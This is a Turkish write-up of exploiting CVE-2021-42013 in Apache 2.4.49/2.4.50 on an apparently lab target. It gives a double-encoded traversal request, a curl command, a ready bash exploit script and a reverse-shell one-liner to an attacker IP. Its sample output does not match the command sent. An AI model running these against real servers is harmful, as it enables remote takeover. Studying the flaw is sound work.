---
title: "CVE-2021-42013: Apache Path Traversal to RCE"
date: 2025-07-23
tag: cve
difficulty: 3
description: "Apache HTTP Server 2.4.49/2.4.50 path traversal and RCE via mod_cgi and URL-encoded path sequences."
---

# Apache HTTP Server 2.4.49/2.4.50 | CVE-2021-42013 | Remote Code Execution

### **Zafiyet:** `Path Traversal` + `Remote Code Execution`
### **CVE:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## Giriş

Bu çalışmada, Apache HTTP Server 2.4.49 ve 2.4.50 sürümlerinde keşfedilen ve CVE-2021-42013 olarak tanımlanan kritik bir uzaktan kod çalıştırma (RCE) zafiyetinin pratik istismar süreci anlatılmıştır. Zafiyet, hatalı URL çözümleme ve CGI dosyalarının kontrolsüz çalıştırılmasından kaynaklanmaktadır. Bu yazıda zafiyetin manuel olarak nasıl doğrulandığı, `curl` ve Burp Suite ile nasıl test edildiği, bir reverse shell elde edilerek istismarın nasıl tamamlandığı adım adım gösterilmiştir.

---

## 1. Zafiyetin Tanımı

Apache HTTP Server 2.4.49 ve 2.4.50 sürümlerinde bulunan bir dizin geçişi (`path traversal`) zafiyeti ile, `.cgi` dosyaları üzerinden komut çalıştırmak mümkündür. Bu zafiyet `%%32%65` gibi **double URL encoding** ile filtreleri bypass etmeyi mümkün kılar.

![](/images/CVE-2021-42013.png)

> 💡 **Zafiyetin Kökeni:**  
Apache 2.4.49'da dizin geçişi (path traversal) kontrolleri eksikti. 2.4.50 sürümünde bu açık kapatılmaya çalışılsa da, **çift katmanlı URL encode (double encoding)** (`%%32%65` → `%2e` → `.`) ile koruma mekanizmaları atlatılabiliyordu. Ayrıca, CGI modülünün `/bin/sh` gibi sistem dosyalarını çalıştırmaya devam etmesi, bu zafiyeti kritik düzeye çıkardı.

---

## 2. Zafiyetin Doğrulanması (Manual Test)

Burp Suite üzerinden aşağıdaki isteği gönderdim:

```http
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 172.20.3.145
User-Agent: curl/8.13.0
Accept: */*
Content-Type: text/plain
Content-Length: 43
Connection: keep-alive

echo Content-Type: text/plain; echo; ls -la
```

Yanıt olarak hedef sistemdeki `uid=1(daemon)` çıktısını aldım:

```http
HTTP/1.1 200 OK
Date: Wed, 23 Jul 2025 06:35:50 GMT
Server: Apache/2.4.50 (Unix)
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain
Content-Length: 45

uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Bu istekle, hedef sistemin komut çalıştırabildiği doğrulandı.

> Not: `Content-Length` değeri **doğru hesaplanmazsa** CGI cevap vermez. Bu yüzden Burp veya curl'da `--data-binary` kullanılmalıdır.

---

## 3. curl ile Komut Çalıştırma

```bash
curl -s --proxy http://127.0.0.1:8080 --path-as-is -H "Content-Type: text/plain" --data "echo Content-Type: text/plain; echo; id" http://172.20.3.145/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
```

Yukarıdaki istekle tekrar `id` çıktısı doğrulandı.

---

## 4. Exploit Scripti Kullanımı

Açığı daha pratik kullanmak için hazır bir `bash` scripti oluşturdum:

```bash
#!/bin/bash

if [[ -z "$1" || -z "$2" ]]; then
  echo "Usage:"
  echo "    $0 <target> <path> '<command>'"
  echo "    $0 172.20.3.145 /bin/sh 'id'"
  exit
fi

curl -s --path-as-is -H "Content-Type: text/plain" --data "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```

---

## 5. Reverse Shell Elde Edilmesi

Netcat ile `4141` portundan dinleme yaptım:

```bash
nc -lvnp 4141
```

Ve aşağıdaki reverse shell komutuyla bağlantı başlattım:

```bash
./cve-2021-42013.sh 172.20.3.145 /bin/bash 'bash -i >& /dev/tcp/10.8.14.193/4141 0>&1'
```

Sonuç olarak hedef sistemden `bash` shell aldım:

![](/images/gettingShell.png)

---

## 6. Sonuç ve Önlem

Bu zafiyet Apache HTTP Server 2.4.49 ve 2.4.50 sürümlerine özeldir ve CGI scriptlerinin bulunduğu sistemlerde **kritik düzeyde RCE** sağlar. Apache 2.4.51 veya üzeri sürüme güncellenmesi tavsiye edilir.

---

## Son Söz

CVE-2021-42013, temel URL parsing hatalarının ne kadar kritik sonuçlar doğurabileceğini gösteren güzel bir örnektir. Bu zafiyet sayesinde yalnızca birkaç satır komutla uzak bir Apache sunucusunda kod çalıştırmak, hatta shell almak mümkün olmuştur. CGI modülü aktif olan sistemlerde bu tarz açıklar zincirleme etki yaratabilir. Bu yüzden yalnızca sürüm güncellemesi değil, sistemde aktif olan modüllerin ve dosya izinlerinin de dikkatle incelenmesi gerekir.
